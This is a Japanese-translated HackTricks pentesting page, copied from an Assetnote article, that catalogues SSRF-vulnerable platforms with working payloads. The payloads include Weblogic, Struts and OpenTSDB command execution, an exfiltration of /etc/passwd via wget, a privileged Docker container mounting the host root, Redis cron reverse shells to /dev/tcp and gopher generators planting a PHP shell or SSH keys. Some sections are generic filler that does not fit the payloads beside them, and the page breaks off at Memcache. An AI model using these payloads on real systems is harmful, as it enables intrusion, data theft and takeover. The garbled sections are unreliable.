# SSRF 脆弱なプラットフォーム

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricks で会社を宣伝**したいですか？または、**PEASS の最新バージョンにアクセスしたり、HackTricks を PDF でダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式の PEASS & HackTricks スワッグ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord グループ**](https://discord.gg/hRep4RUj7f)または[**telegram グループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PR を** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

このセクションは[https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/)からコピーされました。

## Elasticsearch

**一般的にバインドされるポート: 9200**

Elasticsearch が内部で展開されている場合、通常は認証が必要ありません。

部分的に盲目的な SSRF がある場合、ステータスコードを確認できるかどうかをチェックし、次のエンドポイントが 200 を返すかどうかを確認してください：
```http
/_cluster/health
/_cat/indices
/_cat/health
```
もし、POSTリクエストを送信できる盲目的なSSRFがある場合、次のパスにPOSTリクエストを送信することでElasticsearchインスタンスをシャットダウンすることができます。

注意：Elasticsearchバージョン2.x以降では、`_shutdown` APIは削除されています。これはElasticsearch 1.6以前でのみ機能します。
```http
/_shutdown
/_cluster/nodes/_master/_shutdown
/_cluster/nodes/_shutdown
/_cluster/nodes/_all/_shutdown
```
## Weblogic

**一般的にバインドされるポート: 80、443 (SSL)、7001、8888**

**SSRF カナリア: UDDI Explorer (CVE-2014-4210)**
```http
POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1
Host: target.com
Content-Length: 137
Content-Type: application/x-www-form-urlencoded

operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```
これはGETでも機能します：
```bash
http://target.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```
このエンドポイントもCRLFインジェクションの脆弱性があります:
```
GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://attacker.com:4000/exp%20HTTP/1.11%0AX-CLRF%3A%20Injected%0A&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search HTTP/1.0
Host: vuln.weblogic
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Connection: close
```
次のリクエストが生成されます：
```
root@mail:~# nc -lvp 4000
Listening on [0.0.0.0] (family 0, port 4000)
Connection from example.com 43111 received!
POST /exp HTTP/1.11
X-CLRF: Injected HTTP/1.1
Content-Type: text/xml; charset=UTF-8
soapAction: ""
Content-Length: 418
User-Agent: Java1.6.0_24
Host: attacker.com:4000
Accept: text/html, image/gif, image/jpeg, */*; q=.2
Connection: Keep-Alive

<?xml version="1.0" encoding="UTF-8" standalone="yes"?><env:Envelope xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><env:Header/><env:Body><find_business generic="2.0" xmlns="urn:uddi-org:api_v2"><name>sdf</name></find_business></env:Body></env:Envelope>
```
**SSRFカナリア：CVE-2020-14883**

[ここ](https://forum.90sec.com/t/topic/1412)から引用。

Linux：
```http
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://SSRF_CANARY/poc.xml")
```
Windows:

Windows is a widely used operating system developed by Microsoft. It is vulnerable to Server-Side Request Forgery (SSRF) attacks in certain scenarios. SSRF occurs when an attacker is able to make a server perform requests on their behalf, potentially leading to unauthorized access to internal resources or sensitive information.

There are several common platforms and technologies on Windows that are known to be vulnerable to SSRF attacks. These include:

1. Windows Server: Versions of Windows Server, especially older ones, may have vulnerabilities that can be exploited for SSRF attacks. It is important to keep the server up to date with the latest security patches to mitigate these risks.

2. Internet Information Services (IIS): IIS is a web server software package developed by Microsoft. Older versions of IIS may have vulnerabilities that can be exploited for SSRF attacks. It is recommended to use the latest version of IIS and apply any available security updates.

3. .NET Framework: The .NET Framework is a software framework developed by Microsoft that provides a programming model for building applications. Certain versions of the .NET Framework may have vulnerabilities that can be exploited for SSRF attacks. It is important to keep the framework updated with the latest security patches.

4. Windows PowerShell: PowerShell is a command-line shell and scripting language developed by Microsoft. It is commonly used for system administration tasks. Certain versions of PowerShell may have vulnerabilities that can be exploited for SSRF attacks. It is recommended to use the latest version of PowerShell and apply any available security updates.

To protect against SSRF attacks on Windows, it is important to follow security best practices, such as:

- Regularly updating the operating system, server software, and frameworks with the latest security patches.
- Implementing strong access controls and authentication mechanisms to prevent unauthorized access to internal resources.
- Conducting regular security audits and penetration testing to identify and mitigate any vulnerabilities.

By taking these precautions, you can help protect your Windows systems from SSRF attacks and ensure the security of your sensitive information.
```http
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://SSRF_CANARY/poc.xml")
```
## Hashicorp Consul

**一般的にバインドされるポート: 8500, 8501 (SSL)**

[ここ](https://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html)にライトアップがあります。

## Shellshock

**一般的にバインドされるポート: 80, 443 (SSL), 8080**

Shellshockを効果的にテストするためには、ペイロードを含むヘッダを追加する必要がある場合があります。以下のCGIパスは試す価値があります。

テストするためのCGIパスの短いリスト:

[パスを含むGist](https://gist.github.com/infosec-au/009fcbdd5bad16bb6ceb36b838d96be4).

**SSRFキャナリー: ユーザーエージェント経由のShellshock**
```bash
User-Agent: () { foo;}; echo Content-Type: text/plain ; echo ;  curl SSRF_CANARY
```
## Apache Druid

**一般的にバインドされるポート: 80、8080、8888、8082**

Apache DruidのAPIリファレンスは[こちら](https://druid.apache.org/docs/latest/operations/api-reference.html)を参照してください。

ステータスコードを表示できる場合は、以下のパスが200のステータスコードを返すかどうかを確認してください:
```bash
/status/selfDiscovered/status
/druid/coordinator/v1/leader
/druid/coordinator/v1/metadata/datasources
/druid/indexer/v1/taskStatus
```
シャットダウンタスクは、タスクIDまたはデータソース名を推測する必要があります。
```bash
/druid/indexer/v1/task/{taskId}/shutdown
/druid/indexer/v1/datasources/{dataSource}/shutdownAllTasks
```
# Apache Druid Overlordsのスーパーバイザーをシャットダウンする方法:

Apache Druid Overlordsは、Apache Druidクラスターの管理と監視を担当するコンポーネントです。以下の手順に従って、Apache Druid Overlordsのスーパーバイザーをシャットダウンすることができます。

1. Apache Druid Overlordsの管理コンソールにアクセスします。

2. クラスターのノードリストを表示し、スーパーバイザーのノードを特定します。

3. スーパーバイザーのノードにSSH接続します。

4. スーパーバイザープロセスを停止するために、以下のコマンドを実行します。

   ```bash
   sudo supervisorctl stop all
   ```

   このコマンドは、スーパーバイザーが管理しているすべてのプロセスを停止します。

5. スーパーバイザーのノードからSSH接続を切断します。

これで、Apache Druid Overlordsのスーパーバイザーが正常にシャットダウンされました。
```bash
/druid/indexer/v1/supervisor/terminateAll
/druid/indexer/v1/supervisor/{supervisorId}/shutdown
```
## Apache Solr

**一般的にバインドされるポート: 8983**

**SSRFキャナリー: Shardsパラメータ**

> shubhamさんの言っていることに加えて、Solrのスキャンは比較的簡単です。shards=パラメータを使用して、Solrインスタンスに無差別にアクセスしていることを確認するために、SSRFをSSRFにバウンスさせることができます。
>
> — Хавиж Нァッフィ 🥕 (@nnwakelam) [2021年1月13日](https://twitter.com/nnwakelam/status/1349298311853821956?ref\_src=twsrc%5Etfw)

[ここ](https://github.com/veracode-research/solr-injection)から引用。
```bash
/search?q=Apple&shards=http://SSRF_CANARY/solr/collection/config%23&stream.body={"set-property":{"xxx":"yyy"}}
/solr/db/select?q=orange&shards=http://SSRF_CANARY/solr/atom&qt=/select?fl=id,name:author&wt=json
/xxx?q=aaa%26shards=http://SSRF_CANARY/solr
/xxx?q=aaa&shards=http://SSRF_CANARY/solr
```
**SSRF Canary: Solr XXE (2017)**

[Apache Solr 7.0.1 XXE (Packetstorm)](https://packetstormsecurity.com/files/144678/Apache-Solr-7.0.1-XXE-Injection-Code-Execution.html)
```bash
/solr/gettingstarted/select?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://SSRF_CANARY/xxx"'><a></a>'
/xxx?q={!type=xmlparser v="<!DOCTYPE a SYSTEM 'http://SSRF_CANARY/solr'><a></a>"}
```
**dataImportHandlerを介したRCE**

[dataImportHandlerを介したRCEに関する研究](https://github.com/veracode-research/solr-injection#3-cve-2019-0193-remote-code-execution-via-dataimporthandler)

## PeopleSoft

**一般的にバインドされるポート: 80,443 (SSL)**

この研究から引用 [こちら](https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce).

**SSRFキャナリー: XXE #1**
```http
POST /PSIGW/HttpListeningConnector HTTP/1.1
Host: website.com
Content-Type: application/xml
...

<?xml version="1.0"?>
<!DOCTYPE IBRequest [
<!ENTITY x SYSTEM "http://SSRF_CANARY">
]>
<IBRequest>
<ExternalOperationName>&x;</ExternalOperationName>
<OperationType/>
<From><RequestingNode/>
<Password/>
<OrigUser/>
<OrigNode/>
<OrigProcess/>
<OrigTimeStamp/>
</From>
<To>
<FinalDestination/>
<DestinationNode/>
<SubChannel/>
</To>
<ContentSections>
<ContentSection>
<NonRepudiation/>
<MessageVersion/>
<Data><![CDATA[<?xml version="1.0"?>your_message_content]]>
</Data>
</ContentSection>
</ContentSections>
</IBRequest>
```
# SSRF Canary: XXE #2

## Vulnerable Platforms

The following platforms are known to be vulnerable to Server-Side Request Forgery (SSRF) attacks using XML External Entity (XXE) injection:

1. **Workspace**: The Workspace platform allows users to import XML files, making it susceptible to XXE injection attacks. An attacker can craft a malicious XML file containing an external entity reference that points to an internal file, such as `/etc/passwd`, and trigger an SSRF attack to retrieve sensitive information.

2. **AWS EC2**: Amazon Web Services (AWS) Elastic Compute Cloud (EC2) instances can be vulnerable to SSRF attacks via XXE injection. By injecting a malicious XML file that references an external entity, an attacker can force the EC2 instance to make requests to internal resources, potentially leading to unauthorized access or data leakage.

3. **GCP Compute Engine**: Google Cloud Platform (GCP) Compute Engine instances are also susceptible to SSRF attacks through XXE injection. By injecting a specially crafted XML file, an attacker can trick the Compute Engine instance into making requests to internal resources, potentially exposing sensitive information or compromising the system.

4. **Azure Virtual Machines**: Microsoft Azure Virtual Machines can be vulnerable to SSRF attacks using XXE injection. By injecting a malicious XML file, an attacker can manipulate the Virtual Machine to make requests to internal resources, potentially leading to unauthorized access or data leakage.

## Conclusion

These platforms are commonly used in cloud environments and are prone to SSRF attacks when XXE injection vulnerabilities are present. It is crucial for developers and system administrators to be aware of these vulnerabilities and implement proper security measures to mitigate the risk of SSRF attacks.
```http
POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
Host: website.com
Content-Type: application/xml
...

<!DOCTYPE a PUBLIC "-//B/A/EN" "http://SSRF_CANARY">
```
## Apache Struts

**一般的にバインドされるポート: 80,443 (SSL),8080,8443 (SSL)**

[ここ](https://blog.safebuff.com/2016/07/03/SSRF-Tips/)から引用。

**SSRF カナリア: Struts2-016**:

既知のすべての内部エンドポイント/URLの末尾にこれを追加してください:
```http
?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://SSRF_CANARY/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}
```
## JBoss

**一般的にバインドされるポート: 80, 443 (SSL), 8080, 8443 (SSL)**

[ここ](https://blog.safebuff.com/2016/07/03/SSRF-Tips/)から取得しました。

**SSRF カナリア: URL から WAR をデプロイする**
```bash
/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://SSRF_CANARY/utils/cmd.war
```
## Confluence

**一般的にバインドされるポート: 80,443 (SSL),8080,8443 (SSL)**

**SSRF カナリア: Sharelinks (2016年11月以前にリリースされたConfluenceのバージョン)**
```bash
/rest/sharelinks/1.0/link?url=https://SSRF_CANARY/
```
**SSRF Canary: iconUriServlet - Confluence < 6.1.3 (CVE-2017-9506)**

[Atlassian Security Ticket OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
## Jira

**一般的にバインドされるポート: 80,443 (SSL),8080,8443 (SSL)**

**SSRF カナリア: iconUriServlet - Jira < 7.3.5 (CVE-2017-9506)**

[Atlassian Security Ticket OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
**SSRF Canary: makeRequest - Jira < 8.4.0 (CVE-2019-8451)**

[Atlassian Security Ticket JRASERVER-69793](https://jira.atlassian.com/browse/JRASERVER-69793)
```bash
/plugins/servlet/gadgets/makeRequest?url=https://SSRF_CANARY:443@example.com
```
## その他のAtlassian製品

**一般的にバインドされるポート: 80、443 (SSL)、8080、8443 (SSL)**

**SSRF Canary: iconUriServlet (CVE-2017-9506)**:

* Bamboo < 6.0.0
* Bitbucket < 4.14.4
* Crowd < 2.11.2
* Crucible < 4.3.2
* Fisheye < 4.3.2

[AtlassianセキュリティチケットOAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
## OpenTSDB

**一般的にバインドされるポート: 4242**

[OpenTSDBリモートコード実行](https://packetstormsecurity.com/files/136753/OpenTSDB-Remote-Code-Execution.html)

**SSRFキャナリー: RCE経由のcurl**
```bash
/q?start=2016/04/13-10:21:00&ignore=2&m=sum:jmxdata.cpu&o=&yrange=[0:]&key=out%20right%20top&wxh=1900x770%60curl%20SSRF_CANARY%60&style=linespoint&png
```
[OpenTSDB 2.4.0 リモートコード実行](https://github.com/OpenTSDB/opentsdb/issues/2051)

**SSRF カナリア: RCE 経由の curl - CVE-2020-35476**
```bash
/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('wget%20--post-file%20/etc/passwd%20SSRF_CANARY')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
```
## Jenkins

**一般的にバインドされるポート: 80,443 (SSL),8080,8888**

[こちら](https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html)に素晴らしい解説があります。

**SSRF カナリア: CVE-2018-1000600**
```bash
/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://SSRF_CANARY/%23&login=orange&password=tsai
```
**RCE**

GETを介してRCEを達成するための手順については、[Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html)を参照してください。
```bash
/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='orange.tw', root='http://SSRF_CANARY/')%0a@Grab(group='tw.orange', module='poc', version='1')%0aimport Orange;
```
**Groovyを介したRCE**

SSRF（サーバーサイドリクエストフォージェリ）の脆弱なプラットフォームの一つに、Groovyを介したRCE（リモートコード実行）があります。この脆弱性は、Groovyスクリプトを実行する機能が提供されている場合に発生します。

攻撃者は、Groovyスクリプトを使用して、サーバー上で任意のコードを実行することができます。これにより、攻撃者はサーバー内の機密情報にアクセスしたり、システムを乗っ取ったりすることができます。

この脆弱性を悪用するために、攻撃者は以下の手順を実行します。

1. 攻撃者は、Groovyスクリプトを実行するためのエンドポイントを特定します。
2. 攻撃者は、Groovyスクリプト内に任意のコードを埋め込みます。
3. 攻撃者は、Groovyスクリプトを実行するリクエストを送信します。
4. サーバーは、攻撃者が埋め込んだコードを実行します。

この脆弱性を防ぐためには、以下の対策を実施する必要があります。

- Groovyスクリプトの実行機能を無効化する。
- 入力検証を実施し、信頼できないデータがGroovyスクリプトに渡されないようにする。
- セキュリティパッチやアップデートを適用し、最新のバージョンを使用する。

以上がGroovyを介したRCEの概要です。この脆弱性を理解し、適切な対策を講じることが重要です。
```
cmd = 'curl burp_collab'
pay = 'public class x {public x(){"%s".execute()}}' % cmd
data = 'http://jenkins.internal/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=' + urllib.quote(pay)
```
## Hystrix ダッシュボード

**一般的にバインドされるポート: 80,443 (SSL),8080**

Spring Cloud Netflix、バージョン2.2.xの2.2.4より前、バージョン2.1.xの2.1.6より前。

**SSRF カナリア: CVE-2020-5412**
```bash
/proxy.stream?origin=http://SSRF_CANARY/
```
## W3 Total Cache

**一般的にバインドされるポート: 80,443 (SSL)**

W3 Total Cache 0.9.2.6-0.9.3

**SSRF カナリア: CVE-2019-6715**

これは PUT リクエストである必要があります:
```bash
PUT /wp-content/plugins/w3-total-cache/pub/sns.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36
Content-Length: 124
Content-Type: application/x-www-form-urlencoded
Connection: close

{"Type":"SubscriptionConfirmation","Message":"","SubscribeURL":"https://SSRF_CANARY"}
```
**SSRF Canary（SSRF カナリア）**

この脆弱性のアドバイザリはこちらで公開されています：[W3 Total Cache SSRF 脆弱性](https://klikki.fi/adv/w3\_total\_cache.html)

この PHP コードは、SSRF カナリアホストのペイロードを生成します（`url` をカナリアホストに置き換えてください）：
```php
<?php

$url='http://www.google.com';
$file=strtr(base64_encode(gzdeflate($url.'#https://ajax.googleapis.com')), '+/=', '-_');
$file=chop($file,'=');
$req='/wp-content/plugins/w3-total-cache/pub/minify.php?file='.$file.'.css';
echo($req);

?>
```
## Docker

**一般的にバインドされるポート: 2375, 2376 (SSL)**

部分的に盲目的なSSRFを持っている場合、次のパスを使用してDockerのAPIの存在を確認できます:
```bash
/containers/json
/secrets
/services
```
**任意のDockerイメージを実行することによるRCE**

SSRF（サーバーサイドリクエストフォージェリ）の脆弱性を利用して、任意のDockerイメージを実行することにより、リモートコード実行（RCE）を達成することができます。

この攻撃は、SSRFの脆弱性を持つWebアプリケーションを標的にします。攻撃者は、アプリケーション内のURLパラメータやリクエストボディを操作し、任意のURLを指定することができます。

攻撃者は、SSRFを利用してDockerデーモンに接続し、任意のDockerイメージを実行するリクエストを送信します。これにより、攻撃者はコンテナ内で任意のコマンドを実行することができます。

この攻撃を成功させるためには、以下の条件が必要です。

1. ターゲットのWebアプリケーションがSSRFの脆弱性を持っていること。
2. ターゲットのWebアプリケーションがDockerデーモンに接続できること。
3. ターゲットのWebアプリケーションがDockerイメージの実行権限を持っていること。

攻撃者は、以下の手順でRCEを達成します。

1. ターゲットのWebアプリケーションに対してSSRF攻撃を実行し、Dockerデーモンに接続します。
2. 攻撃者は、Dockerデーモンに対して任意のDockerイメージを実行するリクエストを送信します。
3. Dockerデーモンは、指定されたDockerイメージを実行し、攻撃者はコンテナ内で任意のコマンドを実行することができます。

この攻撃により、攻撃者はターゲットのシステムに対して完全な制御を取得することができます。したがって、WebアプリケーションのSSRF脆弱性を修正することが重要です。
```http
POST /containers/create?name=test HTTP/1.1
Host: website.com
Content-Type: application/json
...

{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}
```
alpineを、Dockerコンテナで実行したい任意のイメージに置き換えてください。

## Gitlab Prometheus Redis Exporter

**一般的にバインドされるポート: 9121**

この脆弱性は、Gitlabのバージョン13.1.1より前のインスタンスに影響を与えます。[Gitlabのドキュメント](https://docs.gitlab.com/ee/administration/monitoring/prometheus/#configuring-prometheus)によると、「Prometheusとそのエクスポーターは、GitLab 9.0以降デフォルトで有効になっています。」

これらのエクスポーターは、攻撃者がCVE-2020-13379を使用して他のサービスに侵入し攻撃するための優れた手段を提供します。容易に悪用できるエクスポーターの1つはRedis Exporterです。

以下のエンドポイントは、targetパラメーターを介して提供されるRedisサーバーのすべてのキーをダンプすることを攻撃者に許可します：
```bash
http://localhost:9121/scrape?target=redis://127.0.0.1:7001&check-keys=*
```
**Gopherを介して可能**

## Redis

**一般的にバインドされるポート: 6379**

おすすめの読み物:

* [HTTPリクエストを介してRedisをハックしようとする](https://www.agarri.fr/blog/archives/2014/09/11/trying\_to\_hack\_redis\_via\_http\_requests/index.html)
* [Redisに対するSSRF攻撃](https://maxchadwick.xyz/blog/ssrf-exploits-against-redis)

**Cronを介したRCE** - [Gopher攻撃の対象](https://blog.chaitin.cn/gopher-attack-surfaces/)
```bash
redis-cli -h $1 flushall
echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1\n\n"|redis-cli -h $1 -x set 1
redis-cli -h $1 config set dir /var/spool/cron/
redis-cli -h $1 config set dbfilename root
redis-cli -h $1 save
```
# SSRF Vulnerable Platforms

SSRF (Server-Side Request Forgery) is a common vulnerability that allows an attacker to make requests from the server to other internal or external resources. This can lead to various security risks, such as accessing sensitive information, performing unauthorized actions, or even bypassing firewalls.

SSRF vulnerabilities can be found in various platforms and technologies. Here are some common platforms that are known to be vulnerable to SSRF attacks:

## Gopher

Gopher is a protocol used for retrieving documents over the Internet. It was popular in the early days of the web but has since been largely replaced by HTTP. However, some applications still support the Gopher protocol, and these can be vulnerable to SSRF attacks.

To exploit an SSRF vulnerability in a Gopher-based application, an attacker can craft a malicious request that includes a Gopher URL pointing to an internal resource. When the server processes this request, it will make a request to the specified Gopher URL and return the response to the attacker.

For example, consider the following vulnerable code snippet:

```python
import urllib.request

def fetch_data(url):
    response = urllib.request.urlopen(url)
    data = response.read()
    return data

def process_request(request):
    url = request.get('url')
    data = fetch_data(url)
    return data
```

In this code, the `fetch_data` function makes a request to the specified URL using the `urllib.request.urlopen` function. An attacker can exploit this by sending a request with a malicious URL, such as `gopher://attacker-controlled-server/`.

To prevent SSRF attacks in Gopher-based applications, it is important to validate and sanitize user-supplied URLs before making any requests. Additionally, it is recommended to restrict the protocols and domains that the application can access.

## References

- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [Gopher Protocol](https://en.wikipedia.org/wiki/Gopher_(protocol))
```bash
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```
**RCEを介したシェルのアップロード（PHP）** - [Redis Getshellの概要](https://www.mdeditor.tw/pl/pBy0)
```python
#!/usr/bin/env python
# -*-coding:utf-8-*-

import urllib
protocol="gopher://"
ip="192.168.189.208"
port="6379"
shell="\n\n<?php phpinfo();?>\n\n"
filename="shell.php"
path="/var"
passwd=""

cmd=["flushall",
"set 1 {}".format(shell.replace(" ","${IFS}")),
"config set dir {}".format(path),
"config set dbfilename {}".format(filename),
"save"
]
if passwd:
cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
CRLF="\r\n"
redis_arr = arr.split(" ")
cmd=""
cmd+="*"+str(len(redis_arr))
for x in redis_arr:
cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
cmd+=CRLF
return cmd

if __name__=="__main__":
for x in cmd:
payload += urllib.quote(redis_format(x))
print payload
```
**authorized\_keysを介したRCE** - [Redis Getshellの概要](https://www.mdeditor.tw/pl/pBy0)
```python
import urllib
protocol="gopher://"
ip="192.168.189.208"
port="6379"
# shell="\n\n<?php eval($_GET[\"cmd\"]);?>\n\n"
sshpublic_key = "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8IOnJUAt5b/5jDwBDYJTDULjzaqBe2KW3KhqlaY58XveKQRBLrG3ZV0ffPnIW5SLdueunb4HoFKDQ/KPXFzyvVjqByj5688THkq1RJkYxGlgFNgMoPN151zpZ+eCBdFZEf/m8yIb3/7Cp+31s6Q/DvIFif6IjmVRfWXhnkjNehYjsp4gIEBiiW/jWId5yrO9+AwAX4xSabbxuUyu02AQz8wp+h8DZS9itA9m7FyJw8gCrKLEnM7PK/ClEBevDPSR+0YvvYtnUxeCosqp9VrjTfo5q0nNg9JAvPMs+EA1ohUct9UyXbTehr1Bdv4IXx9+7Vhf4/qwle8HKali3feIZ root@kali\n\n"
filename="authorized_keys"
path="/root/.ssh/"
passwd=""
cmd=["flushall",
"set 1 {}".format(sshpublic_key.replace(" ","${IFS}")),
"config set dir {}".format(path),
"config set dbfilename {}".format(filename),
"save"
]
if passwd:
cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
CRLF="\r\n"
redis_arr = arr.split(" ")
cmd=""
cmd+="*"+str(len(redis_arr))
for x in redis_arr:
cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
cmd+=CRLF
return cmd

if __name__=="__main__":
for x in cmd:
payload += urllib.quote(redis_format(x))
print payload
```
**Gitプロトコルを介したGitLab上のRCE**

Liveoverflowの素晴らしい解説は[こちら](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/)です。

これはGitLabへの認証済みアクセスが必要なため、ハッキング対象の環境で`git`プロトコルが機能する可能性がある場合、ここにペイロードを含めています。このペイロードは参考用です。
```bash
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
## Memcache

**一般的にバインドされるポート: 11211**

